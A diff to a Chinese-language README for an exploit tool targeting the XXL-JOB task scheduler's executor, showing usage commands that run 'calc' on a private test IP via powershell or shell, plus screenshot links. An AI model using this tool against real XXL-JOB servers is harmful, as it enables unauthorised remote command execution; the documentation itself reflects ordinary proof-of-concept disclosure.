@@ -28,8 +28,11 @@ XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅�
 ## 工具使用截图
 ### 用法:
 python3 xxl-job-rce.py [IP Address] -p [Prot(default 9999)] -c [Command] -m[Ccript Method(default powershell)]'
+
 python3 xxl-job-poc.py 192.168.229.146 -c calc
+
 python3 xxl-job-poc.py 192.168.229.146 -c calc -m shell -p 9999
+
 
 ![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-powershell.png)
 ![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-python.png)
